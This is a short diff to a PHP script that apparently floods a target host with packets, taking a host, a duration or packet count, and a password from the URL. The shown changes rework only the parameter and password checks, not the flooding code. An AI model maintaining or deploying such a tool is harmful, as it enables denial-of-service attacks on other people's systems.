@@ -20,6 +20,7 @@ function get_port($port){
 	return (isset($port) && is_numeric($port) && strlen($port) > 0) ? $port : rand(1,65535);
 }
 
+/* SCRIPT START HERE */
 $cli=false;
 
 if(isset($argv)) {
@@ -33,12 +34,16 @@ if(isset($argv)) {
 		}
 }
 
-if(isset($_GET['host'])&&((isset($_GET['time']) && is_numeric($_GET['time']))||isset(($_GET['packet']) && is_numeric($_GET['packet']))&&(isset($_GET['pass'])||$cli==true)){
+if(isset($_GET['host']) && (isset($_GET['time']) && is_numeric($_GET['time'])) || (isset($_GET['packet']) && is_numeric($_GET['packet']))){
 	
 	// If executed from CLI no password
 	if($cli==false){
-		$pass = $_GET['pass'];
-		if (md5($pass) !== "1f3870be274f6c49b3e31a0c6728957f"){ echo "Wrong password!"; exit();}
+		if(isset($_GET['pass'])){
+			$pass = $_GET['pass'];
+			if (md5($pass) !== "1f3870be274f6c49b3e31a0c6728957f"){ echo "Wrong password!"; exit();}
+		}else{
+			echo "No password!"; exit();
+		}
 	}
 	
 	$packets = 0; 
@@ -92,3 +97,4 @@ if(isset($_GET['host'])&&((isset($_GET['time']) && is_numeric($_GET['time']))||i
 	}
 }
 ?>
+
